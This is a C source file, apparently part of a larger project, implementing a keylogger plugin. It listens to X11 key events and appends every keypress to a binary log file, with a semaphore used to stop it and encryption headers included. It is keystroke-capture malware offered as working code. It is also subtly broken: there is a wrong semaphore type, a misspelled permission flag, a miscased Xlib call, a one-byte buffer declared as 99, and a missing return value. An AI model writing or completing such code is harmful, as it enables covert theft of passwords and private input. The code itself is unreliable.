#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <X11/Xlib.h>
#include <semaphore.h>
#include <sys/types.h>
#include <sys/wait.h>

#include "../include/encrypt.h"
#include "../include/hydrogen.h"
#include "../include/types.h"
#include "../include/system_utils.h"

#define SEM "/keylog"

/**
 * Auxiliar functions
 */

int init_plugin()
{
	int flag = 0;
	char buffer;
	FILE* f;
	sem_t close_sem;

	Display* dply;
	XEvent event;
	KeySym symb;


	/**
	 * Open the semaphore, for being able to turn off the keylogger
	 */

	if((close_sem = sem_open(SEM, O_CREAT, S_IRUSR | S_SIWUSR, 1)) == SEM_FAILED)
	{
		DEBUG_PRINT((P_ERROR"Failed to create semaphore"));
		return ERROR;
	}
	/**
	 * Open the display
	 */

	// TODO: Check if we are getting the correct display, suposedly getting DISPLAY enviroment variable

	dply = XOpenDisplay(0);

	/**
	 * Open the file
	 */

	f = fopen("logs/temp.bin", "ab");

	if(f == NULL)
	{
		DEBUG_PRINT((P_ERROR"Failed to open temp.bin in logs/"));
		return ERROR;
	}

	while(flag == 0){
		/**
		 * Get the info in bytes and dump it in a bin file
		 */

		XNextEvent(dply, &event);

		if(event.xany.type  == KeyPress){

			// Event to check, buffer where it would be stored, max size, Gets the mod keys(shift
			// ctrl lock), if 0 does not do anything
			XlookupString(&event.xkey, &buffer, 99, &symb, 0);

			//TODO : Do something about the mod keys

			//TODO: print buffer somewhere

			fwrite(&buffer, sizeof(char), 1, f);
		}

	}

}

